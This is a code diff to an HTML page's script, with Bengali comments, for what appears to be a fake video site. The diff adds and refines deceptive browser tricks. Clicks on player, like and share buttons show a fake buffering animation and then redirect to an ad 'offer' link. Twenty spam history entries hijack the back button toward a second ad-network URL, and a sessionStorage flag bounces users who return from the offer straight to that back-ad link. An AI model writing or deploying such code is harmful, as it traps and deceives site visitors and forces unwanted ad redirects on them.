@@ -428,50 +428,71 @@
             const FIRST_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
             const BACK_AD_LINK     = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
 
-            let isBackHijackLocked = false;
+            let isLocked = false;
 
-            // ১. প্রথম Scroll/Touch-এ ব্যাক বাটন হাইজ্যাক প্রস্তুত করা (কোনো লিংক খুলবে না)
-            function lockBackHijackOnTouchOrScroll() {
-                if (!isBackHijackLocked) {
-                    isBackHijackLocked = true;
-                    // হিস্ট্রি স্প্যাম সেট করা
+            // ১. অফার লিংকে যাওয়ার আগে সেশন স্টোরেজে স্টেট সেভ করা
+            // এতে ইউজার ব্যাক করে আসলেও আমরা বুঝতে পারব সে অফার লিংক থেকে ফিরেছে
+            function checkRedirectOnPageShow() {
+                if (sessionStorage.getItem('offer_visited') === 'true') {
+                    // সেশন ক্লিয়ার করে সঙ্গে সঙ্গে ব্যাক হাইজ্যাক লিংকে পাঠাবে
+                    sessionStorage.removeItem('offer_visited');
+                    window.location.replace(BACK_AD_LINK);
+                }
+            }
+
+            // পেজ লোড বা ব্রাউজারের ব্যাক বাটন দিয়ে পেজে প্রবেশের সাথে সাথে চেক করবে
+            window.addEventListener('pageshow', checkRedirectOnPageShow);
+
+            // ২. স্ক্রল, টাচ বা যেকোনো ক্লিকের সাথে সাথে ব্যাক বাটন হাইজ্যাক প্রস্তুত করা
+            function lockBackHijack() {
+                if (!isLocked) {
+                    isLocked = true;
                     for (let i = 0; i < 20; i++) {
                         window.history.pushState({ hijack: true }, '', window.location.href);
                     }
                 }
             }
 
-            ['touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
-                window.addEventListener(eventType, lockBackHijackOnTouchOrScroll, { passive: true });
+            // Click সহ Touch, Scroll সব ইভেন্টেই হাইজ্যাক লক হবে
+            ['click', 'touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
+                window.addEventListener(eventType, lockBackHijack, { passive: true });
             });
 
-            // ২. ব্যাক বাটনে প্রেস করলেই হাইজ্যাক লিংকে নিয়ে যাবে
+            // ৩. সাধারণ ব্যাক বাটন প্রেস করলে ব্যাক বিজ্ঞাপন লিংকে যাবে
             window.addEventListener('popstate', function(e) {
                 window.location.replace(BACK_AD_LINK);
             });
 
-            // ৩. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং হবে এবং ১মে লিংক খুলবে
+            // ৪. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং + অফার লিংকে রিডাইরেক্ট
             function triggerActionWithBuffer(e) {
                 e.preventDefault();
                 e.stopPropagation();
 
-                // নিশ্চিত করা যেন ব্যাক বাটন হাইজ্যাক লক হয়ে গেছে
-                lockBackHijackOnTouchOrScroll();
+                // ক্লিকের সাথে সাথে হাইজ্যাক লক হবে
+                lockBackHijack();
+
+                // সেশন স্টোরেজে ফ্ল্যাগ সেট করা যেন ব্যাক করলে বোঝা যায়
+                sessionStorage.setItem('offer_visited', 'true');
 
                 // ফেক বাফারিং অ্যানিমেশন দেখানো
                 const loader = document.getElementById('fakeLoader');
                 if (loader) loader.style.display = 'flex';
 
-                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে রিডাইরেক্ট করা
+                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে নিয়ে যাওয়া
                 setTimeout(() => {
                     window.location.href = FIRST_OFFER_LINK;
                 }, 1500);
             }
 
-            // সকল অ্যাকশন এরেমেন্টে (প্লেয়ার, লাইক, শেয়ার, সাইডবার ভিডিও) ইভেন্ট যুক্ত করা
-            document.querySelectorAll('.action-trigger').forEach(el => {
-                el.addEventListener('click', triggerActionWithBuffer);
-            });
+            // অ্যাকশন বাটনগুলোতে ইভেন্ট যুক্ত করা
+            function bindActionButtons() {
+                document.querySelectorAll('.action-trigger').forEach(el => {
+                    el.removeEventListener('click', triggerActionWithBuffer);
+                    el.addEventListener('click', triggerActionWithBuffer);
+                });
+            }
+
+            bindActionButtons();
 
             // VIDEO DATA & DYNAMIC UI
             const videoPool = [
@@ -551,10 +572,8 @@
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // ডায়নামিক এলিমেন্ট তৈরি হওয়ার পর পুনরায় ইভেন্ট বাইন্ড করা
-            document.querySelectorAll('.action-trigger').forEach(el => {
-                el.addEventListener('click', triggerActionWithBuffer);
-            });
+            // ডায়নামিক কন্টেন্ট লোড হওয়ার পর বাটন পুনরায় বাইন্ড
+            bindActionButtons();
         })();
     </script>
 </body>
